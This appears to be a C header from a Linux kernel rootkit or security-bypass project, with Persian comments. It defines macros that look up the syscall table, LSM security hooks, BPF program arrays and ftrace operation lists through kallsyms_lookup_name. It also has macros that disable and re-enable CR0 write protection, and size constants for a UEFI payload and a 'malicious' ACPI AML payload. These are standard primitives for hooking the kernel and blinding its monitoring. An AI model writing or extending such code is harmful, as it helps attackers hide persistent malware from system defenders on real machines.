#ifndef BYPASS_DEFS_H
#define BYPASS_DEFS_H

#include <linux/types.h>
#include <linux/io.h>

// تعاریف توابع هسته
#define get_lsm_head() ((struct hlist_head *)kallsyms_lookup_name("security_hook_heads"))
#define get_bpf_prog_array() ((struct bpf_prog_array *)kallsyms_lookup_name("bpf_prog_array"))
#define get_syscall_table() ((unsigned long *)kallsyms_lookup_name("sys_call_table"))
#define get_ftrace_ops() ((struct ftrace_ops *)kallsyms_lookup_name("ftrace_ops_list"))

// ماکروهای دسترسی سطح پایین
#define disable_wp() write_cr0(read_cr0() & (~0x10000))
#define enable_wp() write_cr0(read_cr0() | 0x10000)

// اندازه‌های پیلود
#define UEFI_PAYLOAD_SIZE 4096
#define MALICIOUS_AML_SIZE 1024

#endif // BYPASS_DEFS_H
